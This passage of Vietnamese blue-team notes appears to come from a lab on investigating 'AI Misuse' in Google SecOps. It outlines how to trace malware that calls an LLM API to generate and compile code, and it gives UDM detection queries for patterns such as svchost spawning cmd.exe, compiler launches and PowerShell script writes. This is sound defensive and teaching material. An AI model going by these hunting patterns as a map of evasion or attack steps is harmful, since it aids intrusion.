4. **Tìm sai trường.** Đường dẫn file có thể chỉ nằm trong command line. Nếu `target.file.full_path` không ra, thử `target.process.command_line` hoặc Raw Log Search.
5. **Log trộn nhiều scenario.** Mỗi event phải nối được vào chuỗi bằng host, user, process cha hoặc thời điểm. Bỏ qua những gì không nối được.

**Quy trình chung cho bài AI Misuse trên SecOps**

1. Đọc threat intel → biết model/API mà malware gọi.
2. Tìm request tới API LLM trong log proxy → lấy user và thời điểm.
3. Pivot theo user sang Sysmon → lấy host, process.
4. Xem timeline trước (cách lây nhiễm) và sau (mã được sinh, biên dịch, chạy).
5. Đi tiếp theo kill chain: privilege escalation → credential access → exfiltration → lateral movement → persistence.

**Cheat sheet UDM query**

| Mục đích | Query |
| --- | --- |
| Request tới API LLM | `target.hostname = /generativelanguage\.googleapis\.com/ nocase` |
| Toàn bộ event của user | `principal.user.userid = "alex.chen" OR target.user.userid = "alex.chen"` |
| Compiler được khởi chạy | `metadata.event_type = "PROCESS_LAUNCH" AND target.process.file.full_path = /gcc\.exe/ nocase` |
| File trong Temp của user | `target.file.full_path = /AppData\\Local\\Temp\\/ nocase` |
| Đường dẫn trong command line | `target.process.command_line = /gcloud/ nocase` |
| svchost khởi chạy cmd | `principal.process.file.full_path = /svchost\.exe/ nocase AND target.process.file.full_path = /cmd\.exe/ nocase` |
| Mọi event trên một host | `principal.hostname = /CYM-CI-RUNNER-01/ nocase` |
| Ghi file .ps1 | `target.file.full_path = /\.ps1$/ nocase` |

## Scenario 3

Phần này sẽ được bổ sung sau khi mình viết lại scenario thứ ba.

